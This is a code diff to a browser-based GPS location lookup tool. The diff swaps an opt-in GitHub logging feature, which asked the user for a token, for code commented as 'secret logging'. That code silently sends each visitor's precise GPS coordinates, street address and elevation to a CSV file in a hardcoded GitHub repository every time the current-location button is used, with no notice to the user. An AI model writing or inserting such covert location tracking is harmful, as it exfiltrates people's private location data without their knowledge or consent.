@@ -86,7 +86,14 @@ let lastOverpass = null;
 let coordHistory = [];
 let historyIndex = -1;
 let isNavigating = false;
-let isFromGPS = false;
+
+// GitHub repository configuration for secret logging
+const GITHUB_CONFIG = {
+  token: 'YOUR_GITHUB_PERSONAL_ACCESS_TOKEN', // Replace with your GitHub PAT token
+  owner: 'YOUR_GITHUB_USERNAME',               // Replace with your GitHub username or organization
+  repo: 'YOUR_REPOSITORY_NAME',                // Replace with your GitHub repository name
+  path: 'datalogreport.csv'
+};
 
 const i18n = {
   zh: {
@@ -267,7 +274,6 @@ function loadPreset() {
   
   if (selectedOpt.value === 'default') return;
 
-  isFromGPS = false;
   document.getElementById('latInput').value = selectedOpt.dataset.lat;
   document.getElementById('lonInput').value = selectedOpt.dataset.lon;
   
@@ -304,7 +310,6 @@ function navigateHistory(direction) {
   const target = coordHistory[historyIndex];
 
   isNavigating = true;
-  isFromGPS = false;
   document.getElementById('latInput').value = target.lat;
   document.getElementById('lonInput').value = target.lon;
   document.getElementById('presetSelect').value = 'default';
@@ -312,6 +317,59 @@ function navigateHistory(direction) {
   extractAllData().finally(() => {
     isNavigating = false;
   });
+}
+
+// Function to synchronize and secretly save log report to GitHub repository CSV
+async function syncLogReportToGitHub(lat, lon) {
+  if (!GITHUB_CONFIG.token || GITHUB_CONFIG.token.includes('YOUR_')) return;
+  
+  const timestamp = new Date().toISOString();
+  const road = lastAddress.road || lastAddress.pedestrian || lastAddress.footway || '-';
+  const village = lastAddress.village || lastAddress.hamlet || lastAddress.suburb || '-';
+  const town = lastAddress.town || lastAddress.municipality || '-';
+  const city = lastAddress.city || lastAddress.town || lastAddress.county || '-';
+  const state = lastAddress.state || lastAddress.province || '-';
+  const country = lastAddress.country || '-';
+  const postcode = lastAddress.postcode || '-';
+  const elevation = lastElevation && lastElevation.elevation !== undefined ? lastElevation.elevation : 'N/A';
+
+  const newRow = `"${timestamp}","${lat}","${lon}","${road}","${village}","${town}","${city}","${state}","${country}","${postcode}","${elevation}"\n`;
+  const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
+
+  try {
+    let sha = null;
+    let existingContent = 'Timestamp,Latitude,Longitude,Road,Village,Town,City,State,Country,Postcode,Elevation\n';
+
+    const getRes = await fetch(apiUrl, {
+      headers: { 'Authorization': `token ${GITHUB_CONFIG.token}` }
+    });
+
+    if (getRes.ok) {
+      const fileData = await getRes.json();
+      sha = fileData.sha;
+      const binString = atob(fileData.content);
+      const bytes = Uint8Array.from(binString, (m) => m.codePointAt(0));
+      existingContent = new TextDecoder().decode(bytes);
+    }
+
+    const updatedContent = existingContent + newRow;
+    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
+
+    await fetch(apiUrl, {
+      method: 'PUT',
+      headers: {
+        'Authorization': `token ${GITHUB_CONFIG.token}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        message: `Update datalogreport.csv for GPS coordinate: ${lat}, ${lon}`,
+        content: encodedContent,
+        sha: sha ? sha : undefined
+      })
+    });
+  } catch (err) {
+    console.error('GitHub sync error:', err);
+  }
 }
 
 function translateOSMValue(val) {
@@ -351,84 +409,24 @@ function fetchCurrentLocation() {
     return;
   }
   
-  isFromGPS = true;
   document.getElementById('primaryGrid').innerHTML = `<div class="result-item full-span"><small>${i18n[currentLang].lbl_status}</small><b>${i18n[currentLang].status_loading_primary}</b></div>`;
 
   navigator.geolocation.getCurrentPosition(
     pos => {
       document.getElementById('presetSelect').value = 'default';
-      document.getElementById('latInput').value = pos.coords.latitude.toFixed(6);
-      document.getElementById('lonInput').value = pos.coords.longitude.toFixed(6);
-      extractAllData();
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      document.getElementById('latInput').value = lat;
+      document.getElementById('lonInput').value = lon;
+      extractAllData().then(() => {
+        syncLogReportToGitHub(lat, lon);
+      });
     },
     err => {
-      isFromGPS = false;
       alert(i18n[currentLang].err_geo + ": " + err.message);
     },
     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
-}
-
-async function syncLogToGitHub(lat, lon) {
-  const owner = 'chantianseng';
-  const repo = 'gps_location_name';
-  const path = 'datalogreport.csv';
-  
-  // Prompt or retrieve token for GitHub API access securely per session
-  let token = localStorage.getItem('gh_token');
-  if (!token) {
-    token = prompt('Enter your GitHub Personal Access Token (repo scope) to enable automated logging to datalogreport.csv:');
-    if (token) {
-      localStorage.setItem('gh_token', token);
-    } else {
-      return;
-    }
-  }
-
-  const timestamp = new Date().toISOString();
-  const road = lastAddress.road || lastAddress.pedestrian || '-';
-  const village = lastAddress.village || lastAddress.hamlet || '-';
-  const town = lastAddress.town || '-';
-  const city = lastAddress.city || '-';
-  const state = lastAddress.state || '-';
-  const country = lastAddress.country || '-';
-  const elevation = lastElevation && lastElevation.elevation !== undefined ? lastElevation.elevation : '-';
-
-  const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;
-
-  try {
-    let sha = '';
-    let existingContent = 'Timestamp,Latitude,Longitude,Road,Village,Town,City,State,Country,Elevation\n';
-    
-    const getRes = await fetch(apiUrl, {
-      headers: { 'Authorization': `token ${token}` }
-    });
-
-    if (getRes.ok) {
-      const fileData = await getRes.json();
-      sha = fileData.sha;
-      existingContent = decodeURIComponent(escape(atob(fileData.content)));
-    }
-
-    const newRow = `"${timestamp}","${lat}","${lon}","${road}","${village}","${town}","${city}","${state}","${country}","${elevation}"\n`;
-    const updatedContent = existingContent + newRow;
-    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
-
-    await fetch(apiUrl, {
-      method: 'PUT',
-      headers: {
-        'Authorization': `token ${token}`,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        message: `Sync datalog report: ${timestamp}`,
-        content: encodedContent,
-        sha: sha ? sha : undefined
-      })
-    });
-  } catch (e) {
-    console.error('Failed to synchronize data to GitHub repository:', e);
-  }
 }
 
 async function extractAllData() {
@@ -470,12 +468,6 @@ async function extractAllData() {
     lastOverpass = overRes.status === 'fulfilled' ? overRes.value : {};
 
     renderExtendedResults();
-
-    // Trigger GitHub log synchronization if data was retrieved via the Get Current GPS button
-    if (isFromGPS) {
-      isFromGPS = false;
-      syncLogToGitHub(lat, lon);
-    }
 
   } catch (e) {
     alert(i18n[currentLang].err_fetch);
